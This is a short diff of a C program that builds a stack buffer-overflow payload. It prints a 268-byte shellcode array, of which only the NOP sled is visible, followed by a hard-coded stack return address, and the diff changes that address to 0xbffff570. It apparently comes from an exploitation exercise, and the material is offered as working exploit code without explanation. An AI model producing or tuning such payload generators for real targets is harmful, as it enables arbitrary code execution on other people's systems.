@@ -19,7 +19,6 @@ char sc[] =
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"; // total 268 bytes
 int main()
 {
-  unsigned int nonprintable=0xbfffef10; // 0xbfffeff0
-  // printf("0123456789ab0123456789ab%s%s\n", (char*)&nonprintable, sc);
+  unsigned int nonprintable=0xbffff570;
   printf("%s%s\n", sc, (char*)&nonprintable);
 }
